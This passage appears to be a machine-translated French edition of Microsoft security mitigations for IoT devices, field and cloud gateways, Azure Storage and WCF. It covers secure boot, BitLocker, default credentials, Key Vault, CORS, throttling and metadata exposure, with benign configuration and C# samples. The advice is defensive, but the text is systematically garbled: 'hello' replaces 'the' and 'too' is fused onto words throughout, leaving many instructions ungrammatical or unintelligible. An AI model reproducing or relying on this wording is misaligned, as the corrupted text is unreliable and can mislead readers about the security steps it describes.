| **Étapes** | Le démarrage sécurisé UEFI limite système de hello tooonly autorise l’exécution de fichiers binaires signés par une autorité spécifiée. Cette fonctionnalité empêche le code inconnu d’être exécutée sur une plateforme de hello et potentiellement d’affaiblissement posture de sécurité hello de celui-ci. Activer le démarrage sécurisé UEFI et restreindre la liste des autorités de certification de confiance pour la signature de code hello. Se connecter tout le code qui est déployé sur le périphérique hello utilisant l’une des autorités de hello approuvé. |

## <a id="partition-iot"></a>Chiffrer les partitions du système d’exploitation et les partitions supplémentaires de l’appareil IoT avec BitLocker

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Appareil IoT | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | Windows 10 IoT Core implémente une version légère de BitLocker chiffrement de l’appareil, ce qui a une dépendance fort sur la présence de hello d’un module de plateforme sécurisée sur plateforme hello, y compris le protocole de preOS nécessaire hello dans UEFI qui effectue des mesures hello. Ces mesures preOS Vérifiez que hello que système d’exploitation possède plus tard un enregistrement définitif de comment hello du système d’exploitation a été lancée. Chiffrer les partitions du système d’exploitation à l’aide de BitLocker et toutes les partitions supplémentaires également au cas où ils stockent des données sensibles. |

## <a id="min-enable"></a>Assurez-vous qu’uniquement hello services/fonctionnalités minimales sont activées sur les appareils

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Appareil IoT | 
| **Phase SDL**               | Déploiement |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | Ne pas activer ou désactiver des fonctionnalités ou des services dans hello du système d’exploitation qui n’est pas requis pour hello fonctionne de la solution de hello. Pour par exemple, si les appareils hello ne requièrent pas un toobe de l’interface utilisateur déployé, installez Windows IoT standard en mode contrôlé à distance. |

## <a id="field-bit-locker"></a>Chiffrer les partitions du système d’exploitation et les partitions supplémentaires de la passerelle de champ IoT avec Bitlocker

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Passerelle de champ IoT | 
| **Phase SDL**               | Déploiement |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | Windows 10 IoT Core implémente une version légère de BitLocker chiffrement de l’appareil, ce qui a une dépendance fort sur la présence de hello d’un module de plateforme sécurisée sur plateforme hello, y compris le protocole de preOS nécessaire hello dans UEFI qui effectue des mesures hello. Ces mesures preOS Vérifiez que hello que système d’exploitation possède plus tard un enregistrement définitif de comment hello du système d’exploitation a été lancée. Chiffrer les partitions du système d’exploitation à l’aide de BitLocker et toutes les partitions supplémentaires également au cas où ils stockent des données sensibles. |

## <a id="default-change"></a>Vérifiez que les informations d’identification du compte de connexion par défaut hello de passerelle de champ hello sont modifiées pendant l’installation

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Passerelle de champ IoT | 
| **Phase SDL**               | Déploiement |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | Vérifiez que les informations d’identification du compte de connexion par défaut hello de passerelle de champ hello sont modifiées pendant l’installation |

## <a id="cloud-firmware"></a>Assurez-vous que la passerelle de Cloud hello implémente un microprogramme des périphériques processus tookeep hello connecté des toodate

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Passerelle de cloud IoT | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | Choix de passerelle - Azure IoT Hub |
| **Informations de référence**              | [La présentation de la gestion de périphérique du Hub IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [comment tooupdate microprogramme de l’appareil](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Étapes** | LWM2M est un protocole de hello Open Mobile Alliance, pour la gestion des appareils IoT. Gestion des appareils Azure IoT permet toointeract avec des périphériques physiques à l’aide des travaux de l’appareil. Assurez-vous que la passerelle de Cloud hello implémente un périphérique de processus tooroutinely conserver hello et d’autres données de configuration des toodate à l’aide de la gestion des appareils Azure IoT Hub. |

## <a id="controls-policies"></a>S’assurer que les appareils disposent de contrôles de sécurité des points de terminaison configurés conformément aux directives organisationnelles

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Délimitation d’approbation machine | 
| **Phase SDL**               | Déploiement |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | N/A  |
| **Étapes** | Assurez-vous que les appareils disposent de contrôles de sécurité pour les points de terminaison, tels que l’outil BitLocker pour le chiffrement au niveau disque, un antivirus avec des signatures mises à jour, un pare-feu basé sur l’hôte, des mises à niveau du système d’exploitation, des stratégies de groupe, etc., qui sont configurés conformément aux stratégies de sécurité organisationnelles. |

## <a id="secure-keys"></a>Garantir une gestion sécurisée des clés d’accès de stockage Azure

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Azure Storage | 
| **Phase SDL**               | Déploiement |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Guide de sécurité de Stockage Azure - Gestion des clés de compte de stockage](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Étapes** | <p>Stockage de clés : Il est recommandé de clés d’accès toostore hello Azure Storage dans Azure Key Vault en tant que secret et ont des applications de hello extraire la clé de hello du coffre de clés. Cette opération est recommandée en raison de toohello suivant raisons :</p><ul><li>application Hello n’aura jamais codé en dur de hello stockage clé dans un fichier de configuration, ce qui supprime cette voie d’une personne l’accès des clés de toohello sans autorisation spécifique</li><li>Touches d’accès toohello peuvent être contrôlés à l’aide d’Azure Active Directory. Cela signifie que d’un propriétaire de compte peut accorder quelques toohello accès aux applications qui nécessitent des clés de hello tooretrieve d’Azure Key Vault. Autres applications ne seront pas en mesure de tooaccess des clés de hello sans leur accorder l’autorisation en particulier</li><li>Régénération de la clé : Il est recommandé de clés de toohave un processus en place tooregenerate accès au stockage Azure pour des raisons de sécurité. Pour plus d’informations sur pourquoi et comment tooplan hello de pour la régénération de la clé sont documentés dans le Guide de sécurité de stockage Azure font référence à l’article</li></ul>|

## <a id="cors-storage"></a>S’assurer que seules les origines approuvées sont autorisées si le mécanisme CORS est activé sur le stockage Azure

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | Azure Storage | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | Générique |
| **Attributs**              | N/A  |
| **Informations de référence**              | [Prise en charge de CORS pour hello Services de stockage Azure](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Étapes** | Le stockage Azure vous permet de tooenable CORS – partage des ressources Cross-Origin. Pour chaque compte de stockage, vous pouvez spécifier les domaines qui peuvent accéder aux ressources hello dans ce compte de stockage. Par défaut, CORS est désactivé sur tous les services. Vous pouvez activer CORS à l’aide de hello API REST ou hello storage client library toocall une des stratégies de service hello méthodes tooset hello. |

## <a id="throttling"></a>Activer la fonctionnalité de limitation de service WCF

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | WCF | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | .NET Framework 3 |
| **Attributs**              | N/A  |
| **Informations de référence**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Étapes** | <p>Hello ne pas en limitant l’utilisation de ressources peut entraîner une insuffisance des ressources et finalement un déni de service de système.</p><ul><li>**Explication :** Windows Communication Foundation (WCF) propose des demandes de service toothrottle hello possibilité. Le fait d’autoriser un nombre excessif de demandes de client est susceptible de saturer un système et d’en épuiser les ressources. Sur hello autre part, en autorisant uniquement un petit nombre de demandes tooa service peut empêcher les utilisateurs légitimes d’utiliser le service de hello. Chaque service doit être analysées individuellement tooand configuré tooallow hello quantité appropriée de ressources.</li><li>**RECOMMANDATIONS** Activez la fonctionnalité de limitation de service de WCF et définissez les limites appropriées pour votre application.</li></ul>|

### <a name="example"></a>Exemple
Hello Voici un exemple de configuration avec la limitation activée :
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Divulgation d’informations WCF par le biais des métadonnées

| Intitulé                   | Détails      |
| ----------------------- | ------------ |
| **Composant**               | WCF | 
| **Phase SDL**               | Créer |  
| **Technologies applicables** | .NET Framework 3 |
| **Attributs**              | N/A  |
| **Informations de référence**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Étapes** | Métadonnées peuvent aider les personnes malveillantes en savoir plus sur le système de hello et planifier une forme d’attaque. Les services WCF peuvent être des métadonnées de tooexpose configuré. Les métadonnées fournissent des descriptions détaillées des services et ne doivent pas être diffusées dans les environnements de production. Hello `HttpGetEnabled`  /  `HttpsGetEnabled` propriétés de classe de ServiceMetaData hello définit si un service expose les métadonnées de hello | 

### <a name="example"></a>Exemple
code Hello ci-dessous indique à WCF toobroadcast métadonnées d’un service
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Ne diffusez pas les métadonnées de service dans un environnement de production. Définir hello HttpGetEnabled / propriétés HttpsGetEnabled de hello ServiceMetaData classe toofalse. 

### <a name="example"></a>Exemple
code Hello ci-dessous indique à WCF toonot les métadonnées d’un service de diffusion. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
